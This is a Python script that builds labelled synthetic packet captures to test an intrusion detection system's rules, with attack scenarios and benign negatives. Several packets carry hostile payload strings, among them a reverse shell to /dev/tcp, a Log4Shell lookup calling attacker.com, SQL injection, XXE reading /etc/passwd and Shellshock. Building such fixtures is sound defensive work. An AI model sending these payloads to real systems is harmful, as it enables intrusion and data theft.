"""
evaluation/generate_test_pcap.py
---------------------------------
Generates labelled synthetic test fixtures for all ten current detection rules.

Each scenario is documented with:
  - scenario_id
  - which rule(s) should fire
  - what benign cases should NOT fire
  - the PCAP file path written

IMPORTANT: Uses an isolated TEST blocklist fixture (data/test_blocklist.txt)
and does NOT write to the production blocklist (data/blocklist.txt).
See §3.11 of the improvement roadmap.

Usage:
  python evaluation/generate_test_pcap.py

Outputs:
  data/test_attacks.pcap          -- all attack scenarios
  data/test_benign.pcap           -- benign negative cases
  data/test_blocklist.txt         -- isolated test-only blocklist fixture
  evaluation/scenarios/test_labels.csv  -- labelled scenario manifest

All packets carry explicit pkt.time values so that replay is deterministic
(§3.1 — timestamps preserved through _extract()).
"""

import os
import sys
import csv
import time

from scapy.all import (
    Ether, IP, IPv6, TCP, UDP, ARP, ICMP, ICMPv6EchoRequest,
    DNS, DNSQR, Raw, wrpcap,
)

# ---------------------------------------------------------------------------
# Paths — all isolated from production data
# ---------------------------------------------------------------------------
_PROJECT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
OUTPUT_ATTACK = os.path.join(_PROJECT_DIR, "data", "test_attacks.pcap")
OUTPUT_BENIGN = os.path.join(_PROJECT_DIR, "data", "test_benign.pcap")
TEST_BLOCKLIST = os.path.join(_PROJECT_DIR, "data", "test_blocklist.txt")  # isolated — not the production blocklist
LABELS_CSV = os.path.join(os.path.dirname(__file__), "scenarios", "test_labels.csv")

# Test-only malicious IP — documentation range (RFC 5737), never in production feeds
TEST_MALICIOUS_IP = "198.51.100.42"

# Base time: a fixed past timestamp so replays are always deterministic
BASE_TIME = 1_700_000_000.0  # 2023-11-14 22:13:20 UTC


# ---------------------------------------------------------------------------
# Scenario manifest (source of truth for the labels CSV)
# ---------------------------------------------------------------------------
SCENARIOS: list[dict] = []


def scenario(
    sid: str,
    rule: str,
    description: str,
    src_ip: str = "",
    dst_ip: str = "",
    dst_port: str = "",
    protocol: str = "",
):
    """Register a scenario in the manifest."""
    SCENARIOS.append({
        "scenario_id":  sid,
        "expected_rule": rule,
        "src_ip":       src_ip,
        "dst_ip":       dst_ip,
        "dst_port":     dst_port,
        "protocol":     protocol,
        "description":  description,
    })


# ---------------------------------------------------------------------------
# Attack scenario packet generators
# ---------------------------------------------------------------------------

def _make_eth(src_mac="aa:bb:cc:11:22:33", dst_mac="00:11:22:33:44:55"):
    return Ether(src=src_mac, dst=dst_mac)


def gen_blocklist_hit(base: float) -> list:
    """S01: A host contacts a known-malicious IP → should fire BLOCKLIST."""
    scenario(
        "S01", "BLOCKLIST",
        "Host contacts known-malicious IP",
        src_ip="192.168.1.55", dst_ip=TEST_MALICIOUS_IP,
        dst_port="443", protocol="TCP",
    )
    pkt = (_make_eth("aa:bb:cc:55:55:55") /
           IP(src="192.168.1.55", dst=TEST_MALICIOUS_IP) /
           TCP(sport=43210, dport=443, flags="S"))
    pkt.time = base + 1.0
    return [pkt]


def gen_vertical_port_scan(base: float) -> list:
    """S02: One src probes 20 distinct ports on one host → VERTICAL PORT_SCAN."""
    scenario(
        "S02", "PORT_SCAN",
        "Vertical port scan: one src, many ports, one target",
        src_ip="192.168.1.105", dst_ip="192.168.1.1",
        protocol="TCP",
    )
    pkts = []
    for i, port in enumerate(range(20, 40)):
        pkt = (_make_eth("de:ad:be:ef:01:05") /
               IP(src="192.168.1.105", dst="192.168.1.1") /
               TCP(sport=55000 + port, dport=port, flags="S"))
        pkt.time = base + 10.0 + (i * 0.05)
        pkts.append(pkt)
    return pkts


def gen_horizontal_port_scan(base: float) -> list:
    """S03: One src probes port 22 across 20 different hosts → HORIZONTAL PORT_SCAN."""
    scenario(
        "S03", "PORT_SCAN",
        "Horizontal port scan: one src, one port, many hosts",
        src_ip="10.0.0.50", dst_port="22", protocol="TCP",
    )
    pkts = []
    for i in range(20):
        pkt = (_make_eth("de:ad:be:ef:01:06") /
               IP(src="10.0.0.50", dst=f"10.0.1.{i + 1}") /
               TCP(sport=60000, dport=22, flags="S"))
        pkt.time = base + 20.0 + (i * 0.05)
        pkts.append(pkt)
    return pkts


def gen_syn_flood(base: float) -> list:
    """S04: 120 SYN packets to port 80 in rapid succession → SYN_FLOOD."""
    scenario(
        "S04", "SYN_FLOOD",
        "SYN burst: 120 SYNs to port 80 in <10s",
        src_ip="192.168.1.200", dst_ip="192.168.1.1",
        dst_port="80", protocol="TCP",
    )
    pkts = []
    for seq in range(120):
        pkt = (_make_eth("de:ad:be:ef:02:00") /
               IP(src="192.168.1.200", dst="192.168.1.1") /
               TCP(sport=10000 + seq, dport=80, flags="S"))
        pkt.time = base + 30.0 + (seq * 0.05)
        pkts.append(pkt)
    return pkts


def gen_arp_spoof(base: float) -> list:
    """S05: First legitimate ARP mapping, then forged claim → ARP_SPOOF."""
    scenario(
        "S05", "ARP_SPOOF",
        "ARP identity change: gateway MAC changes",
        src_ip="192.168.1.1", protocol="ARP",
    )
    # Normal gateway ARP announcement
    normal_arp = (_make_eth("00:11:22:33:44:01", "ff:ff:ff:ff:ff:ff") /
                  ARP(op="is-at", psrc="192.168.1.1",
                      hwsrc="00:11:22:33:44:01", pdst="192.168.1.50"))
    normal_arp.time = base + 50.0

    # Rogue ARP response claiming 192.168.1.1 has a different MAC
    spoofed_arp = (_make_eth("de:ad:be:ef:99:99", "ff:ff:ff:ff:ff:ff") /
                   ARP(op="is-at", psrc="192.168.1.1",
                       hwsrc="de:ad:be:ef:99:99", pdst="192.168.1.50"))
    spoofed_arp.time = base + 51.0
    return [normal_arp, spoofed_arp]


def gen_sql_injection(base: float) -> list:
    """S06: HTTP payload containing SQLi pattern → PAYLOAD_HIT / SQL_INJECTION."""
    scenario(
        "S06", "PAYLOAD_HIT",
        "SQLi pattern in HTTP request body",
        src_ip="192.168.1.77", dst_ip="192.168.1.1",
        dst_port="80", protocol="TCP",
    )
    payload = b"POST /login HTTP/1.1\r\nHost: target\r\n\r\nuser=admin' OR 1=1--"
    pkt = (_make_eth() /
           IP(src="192.168.1.77", dst="192.168.1.1") /
           TCP(sport=54321, dport=80, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 60.0
    return [pkt]


def gen_cmd_injection(base: float) -> list:
    """S07: HTTP payload containing reverse-shell pattern → PAYLOAD_HIT / CMD_INJECTION."""
    scenario(
        "S07", "PAYLOAD_HIT",
        "CMD_INJECTION / reverse shell in HTTP payload",
        src_ip="192.168.1.78", dst_ip="192.168.1.1",
        dst_port="80", protocol="TCP",
    )
    payload = b"GET /?cmd=bash+-i+>%26+/dev/tcp/10.0.0.99/4444+0>%261 HTTP/1.1\r\n"
    pkt = (_make_eth() /
           IP(src="192.168.1.78", dst="192.168.1.1") /
           TCP(sport=54322, dport=80, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 61.0
    return [pkt]


def gen_log4shell(base: float) -> list:
    """S08: HTTP payload containing Log4Shell JNDI pattern → PAYLOAD_HIT / LOG4SHELL."""
    scenario(
        "S08", "PAYLOAD_HIT",
        "Log4Shell JNDI injection in User-Agent",
        src_ip="192.168.1.79", dst_ip="192.168.1.1",
        dst_port="8080", protocol="TCP",
    )
    payload = (b"GET / HTTP/1.1\r\n"
               b"User-Agent: ${jndi:ldap://attacker.com/exploit}\r\n\r\n")
    pkt = (_make_eth() /
           IP(src="192.168.1.79", dst="192.168.1.1") /
           TCP(sport=54323, dport=8080, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 62.0
    return [pkt]


def gen_credential_leak(base: float) -> list:
    """S09: HTTP payload leaking plaintext password → PAYLOAD_HIT / CREDENTIAL_LEAK."""
    scenario(
        "S09", "PAYLOAD_HIT",
        "Plaintext password= in HTTP POST body",
        src_ip="192.168.1.80", dst_ip="192.168.1.1",
        dst_port="80", protocol="TCP",
    )
    payload = b"POST /auth HTTP/1.1\r\n\r\nusername=alice&password=s3cr3t123"
    pkt = (_make_eth() /
           IP(src="192.168.1.80", dst="192.168.1.1") /
           TCP(sport=54324, dport=80, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 63.0
    return [pkt]


def gen_dns_dga(base: float) -> list:
    """S10: High-entropy DNS query (DGA-like) → DNS_ANOMALY."""
    scenario(
        "S10", "DNS_ANOMALY",
        "High-entropy DGA-like DNS query",
        src_ip="192.168.1.88", dst_ip="8.8.8.8",
        dst_port="53", protocol="UDP",
    )
    dga_label = "xvqrztmplwbsnfhk"
    pkt = (_make_eth() /
           IP(src="192.168.1.88", dst="8.8.8.8") /
           UDP(sport=54321, dport=53) /
           DNS(rd=1, qd=DNSQR(qname=f"{dga_label}.badactor.ru")))
    pkt.time = base + 70.0
    return [pkt]


def gen_dns_long(base: float) -> list:
    """S11: Very long DNS query (tunnelling-like) → DNS_ANOMALY."""
    scenario(
        "S11", "DNS_ANOMALY",
        "Unusually long DNS query (>60 chars)",
        src_ip="192.168.1.89", dst_ip="8.8.8.8",
        dst_port="53", protocol="UDP",
    )
    long_label = "a" * 63
    pkt = (_make_eth() /
           IP(src="192.168.1.89", dst="8.8.8.8") /
           UDP(sport=54322, dport=53) /
           DNS(rd=1, qd=DNSQR(qname=f"{long_label}.tunnel.example.com")))
    pkt.time = base + 71.0
    return [pkt]


def gen_icmp_sweep(base: float) -> list:
    """S12: One source sends echo requests to many hosts → ICMP_SWEEP."""
    scenario(
        "S12", "ICMP_SWEEP",
        "ICMP host discovery: one source probes 16 distinct hosts",
        src_ip="192.168.1.90", protocol="ICMP",
    )
    pkts = []
    for i in range(16):
        pkt = (_make_eth() /
               IP(src="192.168.1.90", dst=f"10.10.0.{i + 1}") /
               ICMP(type=8, code=0, id=90, seq=i))
        pkt.time = base + 80.0 + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_udp_port_scan(base: float) -> list:
    """S13: One source probes many UDP ports on one host → UDP_SCAN."""
    scenario(
        "S13", "UDP_SCAN",
        "UDP port scan: one source probes 16 ports on one target",
        src_ip="192.168.1.91", dst_ip="10.20.0.20", protocol="UDP",
    )
    pkts = []
    for i, port in enumerate(range(10000, 10016)):
        pkt = (_make_eth() /
               IP(src="192.168.1.91", dst="10.20.0.20") /
               UDP(sport=52000 + i, dport=port))
        pkt.time = base + 90.0 + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_ipv6_udp_port_scan(base: float) -> list:
    """S14: IPv6 host probes many UDP ports → UDP_SCAN through full replay."""
    scenario(
        "S14", "UDP_SCAN", "IPv6 UDP vertical port scan",
        src_ip="2001:db8::91", dst_ip="2001:db8::20", protocol="UDP",
    )
    pkts = []
    for i, port in enumerate(range(12000, 12016)):
        pkt = (_make_eth() /
               IPv6(src="2001:db8::91", dst="2001:db8::20") /
               UDP(sport=53000 + i, dport=port))
        pkt.time = base + 100.0 + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_tcp_stealth_scan(base: float) -> list:
    """S20: FIN, NULL, and Xmas probes across ports → TCP_STEALTH_SCAN."""
    scenario(
        "S20", "TCP_STEALTH_SCAN", "Vertical TCP FIN/NULL/Xmas stealth scan",
        src_ip="192.0.2.20", dst_ip="192.0.2.80", protocol="TCP",
    )
    flags = ("F", 0, "FPU")
    packets = []
    for i, port in enumerate(range(13000, 13015)):
        pkt = (_make_eth() /
               IP(src="192.0.2.20", dst="192.0.2.80") /
               TCP(sport=45000 + i, dport=port, flags=flags[i % len(flags)]))
        pkt.time = base + 124.0 + i * 0.05
        packets.append(pkt)
    return packets


def gen_distributed_syn_flood(base: float) -> list:
    """S15: At least 500 SYNs from 20 sources to one service."""
    scenario(
        "S15", "DISTRIBUTED_SYN_FLOOD", "Distributed SYN flood across 20 sources",
        dst_ip="192.0.2.80", dst_port="80", protocol="TCP",
    )
    pkts = []
    for i in range(500):
        source = f"198.51.100.{i % 20 + 1}"
        pkt = (_make_eth() /
               IP(src=source, dst="192.0.2.80") /
               TCP(sport=40000 + i % 20000, dport=80, flags="S"))
        pkt.time = base + 110.0 + i * 0.001
        pkts.append(pkt)
    return pkts


def gen_fragmented_sqli(base: float) -> list:
    """S16: SQL injection signature split across adjacent TCP segments."""
    scenario(
        "S16", "PAYLOAD_HIT", "SQL injection signature split across TCP segments",
        src_ip="192.0.2.16", dst_ip="192.0.2.80", dst_port="80", protocol="TCP",
    )
    first = b"POST /search?q=UNION SEL"
    second = b"ECT password FROM users HTTP/1.1\r\nHost: target\r\n\r\n"
    seq = 10000
    packets = []
    for i, (part, segment_seq) in enumerate(((first, seq), (second, seq + len(first)))):
        pkt = (_make_eth() /
               IP(src="192.0.2.16", dst="192.0.2.80") /
               TCP(sport=44016, dport=80, seq=segment_seq, flags="PA") /
               Raw(load=part))
        pkt.time = base + 120.0 + i * 0.01
        packets.append(pkt)
    return packets


def gen_url_encoded_sqli(base: float) -> list:
    """S17: URL-encoded SQLi marker should be detected after one decode."""
    scenario(
        "S17", "PAYLOAD_HIT", "Single URL-encoded SQL injection signature",
        src_ip="192.0.2.17", dst_ip="192.0.2.80", dst_port="80", protocol="TCP",
    )
    pkt = (_make_eth() /
           IP(src="192.0.2.17", dst="192.0.2.80") /
           TCP(sport=44017, dport=80, seq=20000, flags="PA") /
           Raw(load=b"GET /search?q=%55NION%20SELECT HTTP/1.1\r\nHost: target\r\n\r\n"))
    pkt.time = base + 121.0
    return [pkt]


def gen_nested_label_dga(base: float) -> list:
    """S18: Randomized non-leading DNS label should still be analyzed."""
    scenario(
        "S18", "DNS_ANOMALY", "High-entropy nested DNS label",
        src_ip="192.168.1.92", dst_ip="8.8.8.8", dst_port="53", protocol="UDP",
    )
    pkt = (_make_eth() /
           IP(src="192.168.1.92", dst="8.8.8.8") /
           UDP(sport=54323, dport=53) /
           DNS(rd=1, qd=DNSQR(qname="api.xvqrztmplwbsnfhk.example.com")))
    pkt.time = base + 122.0
    return [pkt]


def gen_dns_frequency_burst(base: float) -> list:
    """S19: A source makes 20 distinct low-entropy queries to one parent."""
    scenario(
        "S19", "DNS_ANOMALY", "Burst of 20 distinct DNS names under one parent",
        src_ip="192.168.1.93", dst_ip="8.8.8.8", dst_port="53", protocol="UDP",
    )
    packets = []
    for i in range(20):
        pkt = (_make_eth() /
               IP(src="192.168.1.93", dst="8.8.8.8") /
               UDP(sport=54400 + i, dport=53) /
               DNS(rd=1, qd=DNSQR(qname="api.rate-test.example.com")))
        pkt.time = base + 123.0 + i * 0.02
        packets.append(pkt)
    return packets


def gen_brute_force_ssh(base: float) -> list:
    """S21: Rapid SYN connection burst targeting SSH auth port 22 → BRUTE_FORCE."""
    scenario(
        "S21", "BRUTE_FORCE",
        "SSH credential brute force: 22 connection attempts in rapid succession",
        src_ip="192.168.1.95", dst_ip="192.168.1.1",
        dst_port="22", protocol="TCP",
    )
    pkts = []
    for i in range(22):
        pkt = (_make_eth() /
               IP(src="192.168.1.95", dst="192.168.1.1") /
               TCP(sport=50000 + i, dport=22, flags="S"))
        pkt.time = base + 130.0 + i * 0.05
        pkts.append(pkt)
    return pkts


def gen_slow_vertical_port_scan(base: float) -> list:
    """S22: 32 distinct ports probed over 56s evades 10s window → SLOW_PORT_SCAN."""
    scenario(
        "S22", "SLOW_PORT_SCAN",
        "Low-and-slow vertical port scan: 32 ports probed over 56 seconds",
        src_ip="192.168.1.96", dst_ip="192.168.1.1",
        protocol="TCP",
    )
    pkts = []
    for i, port in enumerate(range(20000, 20032)):
        pkt = (_make_eth() /
               IP(src="192.168.1.96", dst="192.168.1.1") /
               TCP(sport=51000 + i, dport=port, flags="S"))
        pkt.time = base + 140.0 + i * 1.8
        pkts.append(pkt)
    return pkts


def gen_rst_flood(base: float) -> list:
    """S23: 120 RST packets in rapid succession → SYN_FLOOD (RST flood)."""
    scenario(
        "S23", "SYN_FLOOD",
        "RST flood: 120 RST packets to port 80 in <10s",
        src_ip="192.168.1.201", dst_ip="192.168.1.1",
        dst_port="80", protocol="TCP",
    )
    pkts = []
    for seq in range(120):
        pkt = (_make_eth() /
               IP(src="192.168.1.201", dst="192.168.1.1") /
               TCP(sport=12000 + seq, dport=80, flags="R"))
        pkt.time = base + 200.0 + seq * 0.02
        pkts.append(pkt)
    return pkts


def gen_dns_subdomain_exfil(base: float) -> list:
    """S24: 25 distinct subdomains under one parent domain → DNS_ANOMALY (DNS_EXFIL)."""
    scenario(
        "S24", "DNS_ANOMALY",
        "DNS subdomain data exfiltration: 25 unique subdomains under one parent",
        src_ip="192.168.1.94", dst_ip="8.8.8.8",
        dst_port="53", protocol="UDP",
    )
    pkts = []
    for i in range(25):
        pkt = (_make_eth() /
               IP(src="192.168.1.94", dst="8.8.8.8") /
               UDP(sport=54500 + i, dport=53) /
               DNS(rd=1, qd=DNSQR(qname=f"chunk{i:03d}.tunnel-exfil.com")))
        pkt.time = base + 210.0 + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_xxe_injection(base: float) -> list:
    """S25: XML External Entity (XXE) injection payload → PAYLOAD_HIT."""
    scenario(
        "S25", "PAYLOAD_HIT",
        "XML External Entity (XXE) injection in HTTP body",
        src_ip="192.168.1.81", dst_ip="192.168.1.1",
        dst_port="80", protocol="TCP",
    )
    payload = b'POST /xml HTTP/1.1\r\nHost: target\r\n\r\n<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
    pkt = (_make_eth() /
           IP(src="192.168.1.81", dst="192.168.1.1") /
           TCP(sport=54325, dport=80, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 220.0
    return [pkt]


def gen_shellshock(base: float) -> list:
    """S26: Shellshock function definition injection → PAYLOAD_HIT."""
    scenario(
        "S26", "PAYLOAD_HIT",
        "Shellshock bash environment function injection in HTTP header",
        src_ip="192.168.1.82", dst_ip="192.168.1.1",
        dst_port="80", protocol="TCP",
    )
    payload = b'GET /cgi-bin/test.cgi HTTP/1.1\r\nUser-Agent: () { :;}; /bin/bash -c "id"\r\n\r\n'
    pkt = (_make_eth() /
           IP(src="192.168.1.82", dst="192.168.1.1") /
           TCP(sport=54326, dport=80, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 221.0
    return [pkt]


def gen_deserialization(base: float) -> list:
    """S27: Java serialized object magic bytes in HTTP payload → PAYLOAD_HIT."""
    scenario(
        "S27", "PAYLOAD_HIT",
        "Java serialized object magic bytes payload",
        src_ip="192.168.1.83", dst_ip="192.168.1.1",
        dst_port="8080", protocol="TCP",
    )
    payload = b'POST /api/remoting HTTP/1.1\r\nHost: target\r\n\r\n\xac\xed\x00\x05sr\x00\x11java.lang.Process'
    pkt = (_make_eth() /
           IP(src="192.168.1.83", dst="192.168.1.1") /
           TCP(sport=54327, dport=8080, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 222.0
    return [pkt]


def gen_tcp_flag_anomaly(base: float) -> list:
    """S28: Malformed TCP packet with conflicting SYN+FIN flags → TCP_FLAG_ANOMALY."""
    scenario(
        "S28", "TCP_FLAG_ANOMALY",
        "Malformed TCP packet with conflicting SYN+FIN flags",
        src_ip="192.168.1.97", dst_ip="192.168.1.1",
        dst_port="80", protocol="TCP",
    )
    pkt = (_make_eth() /
           IP(src="192.168.1.97", dst="192.168.1.1") /
           TCP(sport=54328, dport=80, flags="SF"))
    pkt.time = base + 230.0
    return [pkt]


# ---------------------------------------------------------------------------
# Benign negative packet generators  (should NOT fire any rule)
# ---------------------------------------------------------------------------

def gen_benign_http(base: float) -> list:
    """B01: Normal HTTP GET — should NOT fire PayloadRule."""
    pkts = []
    payload = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nAccept: */*\r\n\r\n"
    for i in range(3):
        pkt = (_make_eth() /
               IP(src="192.168.1.10", dst="93.184.216.34") /
               TCP(sport=50000 + i, dport=80, flags="PA") /
               Raw(load=payload))
        pkt.time = base + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_benign_dns(base: float) -> list:
    """B02: Normal short, low-entropy DNS queries — should NOT fire DnsRule."""
    pkts = []
    for i, name in enumerate([
        "google.com", "example.com", "github.com", "api.services.example.com",
    ]):
        pkt = (_make_eth() /
               IP(src="192.168.1.10", dst="8.8.8.8") /
               UDP(sport=50000 + i, dport=53) /
               DNS(rd=1, qd=DNSQR(qname=name)))
        pkt.time = base + 0.5 + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_benign_dns_below_frequency(base: float) -> list:
    """Nineteen ordinary lookups stay below the configured frequency boundary."""
    packets = []
    for i in range(19):
        pkt = (_make_eth() /
               IP(src="192.168.1.11", dst="8.8.8.8") /
               UDP(sport=51000 + i, dport=53) /
               DNS(rd=1, qd=DNSQR(qname=f"h{i}.healthy.example.net")))
        pkt.time = base + 2.5 + i * 0.02
        packets.append(pkt)
    return packets


def gen_benign_dns_server_reply(base: float) -> list:
    """B03: DNS server replying to many clients — should NOT fire PortScanRule.

    A naive port-scan rule would see many different 'destination ports'
    in the reply direction and falsely flag the DNS server.
    PortScanRule's WELL_KNOWN_SERVICE_PORTS filter (src_port=53) prevents this.
    """
    pkts = []
    for i in range(20):
        pkt = (_make_eth("00:11:22:33:44:01") /
               IP(src="8.8.8.8", dst=f"192.168.1.{i + 10}") /
               UDP(sport=53, dport=40000 + i))
        pkt.time = base + 1.0 + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_benign_cdn_dns(base: float) -> list:
    """B04: Legitimate high-entropy CDN domain — should NOT fire DnsRule."""
    pkts = []
    for i, name in enumerate([
        "a0.akamai.net",
        "r3.o.lencr.org",
        "xvqrztmp.cloudflare.com",   # high entropy but whitelisted suffix
    ]):
        pkt = (_make_eth() /
               IP(src="192.168.1.10", dst="8.8.8.8") /
               UDP(sport=50010 + i, dport=53) /
               DNS(rd=1, qd=DNSQR(qname=name)))
        pkt.time = base + 2.0 + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_benign_normal_arp(base: float) -> list:
    """B05: Stable ARP — same IP/MAC seen twice — should NOT fire ArpSpoofRule."""
    pkts = []
    for i in range(2):
        pkt = (_make_eth("00:aa:bb:cc:dd:ee", "ff:ff:ff:ff:ff:ff") /
               ARP(op="is-at", psrc="192.168.1.1",
                   hwsrc="00:aa:bb:cc:dd:ee", pdst="192.168.1.50"))
        pkt.time = base + 3.0 + i * 5.0
        pkts.append(pkt)
    return pkts


def gen_benign_syn_below_threshold(base: float) -> list:
    """B06: SYN packets well below flood threshold — should NOT fire SynFloodRule."""
    pkts = []
    for i in range(10):
        pkt = (_make_eth() /
               IP(src="192.168.1.20", dst="192.168.1.1") /
               TCP(sport=50100 + i, dport=80, flags="S"))
        pkt.time = base + 4.0 + i * 0.5  # spaced out, well under threshold
        pkts.append(pkt)
    return pkts


def gen_benign_stealth_below_threshold(base: float) -> list:
    """Fourteen FIN probes stay below the stealth scan threshold."""
    packets = []
    for i, port in enumerate(range(14000, 14014)):
        pkt = (_make_eth() /
               IP(src="192.168.1.32", dst="192.168.1.1") /
               TCP(sport=52000 + i, dport=port, flags="F"))
        pkt.time = base + 9.0 + i * 0.1
        packets.append(pkt)
    return packets


def gen_benign_icmp_repeated_target(base: float) -> list:
    """B07: Repeated echo requests to one host are not a host sweep."""
    pkts = []
    for i in range(20):
        pkt = (_make_eth() /
               IP(src="192.168.1.30", dst="192.168.1.1") /
               ICMP(type=8, code=0, id=30, seq=i))
        pkt.time = base + 5.0 + i * 0.25
        pkts.append(pkt)
    return pkts


def gen_benign_udp_repeated_target(base: float) -> list:
    """B08: Repeated UDP requests to one destination/port are not a sweep."""
    pkts = []
    for i in range(25):
        pkt = (_make_eth() /
               IP(src="192.168.1.31", dst="8.8.8.8") /
               UDP(sport=52000 + i, dport=53))
        pkt.time = base + 6.0 + i * 0.2
        pkts.append(pkt)
    return pkts


def gen_benign_ipv6_icmp_repeated_target(base: float) -> list:
    """IPv6 echo requests to one host should not trigger ICMP_SWEEP."""
    pkts = []
    for i in range(20):
        pkt = (_make_eth() /
               IPv6(src="2001:db8::30", dst="2001:db8::1") /
               ICMPv6EchoRequest(id=30, seq=i))
        pkt.time = base + 7.0 + i * 0.2
        pkts.append(pkt)
    return pkts


def gen_benign_distributed_syn_below_source_threshold(base: float) -> list:
    """High aggregate rate from 19 hosts must not meet the 20-source guard."""
    pkts = []
    for source_index in range(19):
        for i in range(30):
            pkt = (_make_eth() /
                   IP(src=f"198.51.100.{source_index + 1}", dst="192.0.2.81") /
                   TCP(sport=41000 + i, dport=80, flags="S"))
            pkt.time = base + 8.0 + (source_index * 30 + i) * 0.001
            pkts.append(pkt)
    return pkts


def gen_benign_slow_scan_below_threshold(base: float) -> list:
    """Fourteen probes over 30s stay below the 30-port slow scan threshold."""
    pkts = []
    for i, port in enumerate(range(30000, 30014)):
        pkt = (_make_eth() /
               IP(src="192.168.1.33", dst="192.168.1.1") /
               TCP(sport=56000 + i, dport=port, flags="S"))
        pkt.time = base + 10.0 + i * 2.0
        pkts.append(pkt)
    return pkts


def gen_benign_auth_attempts_below_threshold(base: float) -> list:
    """Five SSH connections over 30s stay below the 20-attempt brute force threshold."""
    pkts = []
    for i in range(5):
        pkt = (_make_eth() /
               IP(src="192.168.1.34", dst="192.168.1.1") /
               TCP(sport=57000 + i, dport=22, flags="S"))
        pkt.time = base + 11.0 + i * 6.0
        pkts.append(pkt)
    return pkts


def gen_benign_dns_few_subdomains(base: float) -> list:
    """Three standard corporate subdomains stay below exfil threshold."""
    pkts = []
    for i, sub in enumerate(["mail", "www", "vpn"]):
        pkt = (_make_eth() /
               IP(src="192.168.1.35", dst="8.8.8.8") /
               UDP(sport=58000 + i, dport=53) /
               DNS(rd=1, qd=DNSQR(qname=f"{sub}.corp-internal.com")))
        pkt.time = base + 12.0 + i * 1.0
        pkts.append(pkt)
    return pkts


def gen_benign_rst_handshakes(base: float) -> list:
    """Five normal TCP reset packets stay below RST flood threshold."""
    pkts = []
    for i in range(5):
        pkt = (_make_eth() /
               IP(src="192.168.1.36", dst="192.168.1.1") /
               TCP(sport=59000 + i, dport=80, flags="R"))
        pkt.time = base + 13.0 + i * 1.0
        pkts.append(pkt)
    return pkts


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def generate_all():
    base = BASE_TIME

    # Clear manifest so repeated calls in the same process don't accumulate
    SCENARIOS.clear()

    print("[*] Generating ATTACK scenarios ...")
    attack_pkts = []
    attack_pkts += gen_blocklist_hit(base)
    attack_pkts += gen_vertical_port_scan(base)
    attack_pkts += gen_horizontal_port_scan(base)
    attack_pkts += gen_syn_flood(base)
    attack_pkts += gen_arp_spoof(base)
    attack_pkts += gen_sql_injection(base)
    attack_pkts += gen_cmd_injection(base)
    attack_pkts += gen_log4shell(base)
    attack_pkts += gen_credential_leak(base)
    attack_pkts += gen_dns_dga(base)
    attack_pkts += gen_dns_long(base)
    attack_pkts += gen_icmp_sweep(base)
    attack_pkts += gen_udp_port_scan(base)
    attack_pkts += gen_ipv6_udp_port_scan(base)
    attack_pkts += gen_distributed_syn_flood(base)
    attack_pkts += gen_fragmented_sqli(base)
    attack_pkts += gen_url_encoded_sqli(base)
    attack_pkts += gen_nested_label_dga(base)
    attack_pkts += gen_dns_frequency_burst(base)
    attack_pkts += gen_tcp_stealth_scan(base)
    attack_pkts += gen_brute_force_ssh(base)
    attack_pkts += gen_slow_vertical_port_scan(base)
    attack_pkts += gen_rst_flood(base)
    attack_pkts += gen_dns_subdomain_exfil(base)
    attack_pkts += gen_xxe_injection(base)
    attack_pkts += gen_shellshock(base)
    attack_pkts += gen_deserialization(base)
    attack_pkts += gen_tcp_flag_anomaly(base)

    os.makedirs("data", exist_ok=True)
    wrpcap(OUTPUT_ATTACK, attack_pkts)
    print(f"  [✔] {len(attack_pkts)} attack packets → {OUTPUT_ATTACK}")

    print("[*] Generating BENIGN negative scenarios ...")
    benign_pkts = []
    benign_pkts += gen_benign_http(base)
    benign_pkts += gen_benign_dns(base)
    benign_pkts += gen_benign_dns_below_frequency(base)
    benign_pkts += gen_benign_dns_server_reply(base)
    benign_pkts += gen_benign_cdn_dns(base)
    benign_pkts += gen_benign_normal_arp(base)
    benign_pkts += gen_benign_syn_below_threshold(base)
    benign_pkts += gen_benign_stealth_below_threshold(base)
    benign_pkts += gen_benign_icmp_repeated_target(base)
    benign_pkts += gen_benign_udp_repeated_target(base)
    benign_pkts += gen_benign_ipv6_icmp_repeated_target(base)
    benign_pkts += gen_benign_distributed_syn_below_source_threshold(base)
    benign_pkts += gen_benign_slow_scan_below_threshold(base)
    benign_pkts += gen_benign_auth_attempts_below_threshold(base)
    benign_pkts += gen_benign_dns_few_subdomains(base)
    benign_pkts += gen_benign_rst_handshakes(base)

    wrpcap(OUTPUT_BENIGN, benign_pkts)
    print(f"  [✔] {len(benign_pkts)} benign packets → {OUTPUT_BENIGN}")

    # Write the isolated test blocklist (NOT the production blocklist)
    with open(TEST_BLOCKLIST, "w") as f:
        f.write(f"# Test-only blocklist — do not use in production\n")
        f.write(f"{TEST_MALICIOUS_IP}\n")
    print(f"  [✔] Test blocklist → {TEST_BLOCKLIST}")

    # Write labelled scenario CSV with full endpoint fields (P0)
    os.makedirs(os.path.dirname(LABELS_CSV), exist_ok=True)
    with open(LABELS_CSV, "w", newline="") as f:
        writer = csv.DictWriter(
            f,
            fieldnames=[
                "scenario_id", "expected_rule",
                "src_ip", "dst_ip", "dst_port", "protocol",
                "description",
            ],
            lineterminator="\n",
        )
        writer.writeheader()
        writer.writerows(SCENARIOS)
    print(f"  [✔] Scenario labels ({len(SCENARIOS)} scenarios) → {LABELS_CSV}")

    print("\n[*] Summary:")
    print(f"    Attack PCAP:   {OUTPUT_ATTACK}")
    print(f"    Benign PCAP:   {OUTPUT_BENIGN}")
    print(f"    Test blocklist:{TEST_BLOCKLIST}")
    print(f"    Labels CSV:    {LABELS_CSV}")
    print()
    print("[*] To replay + evaluate (copy-paste ready, uses isolated state):")
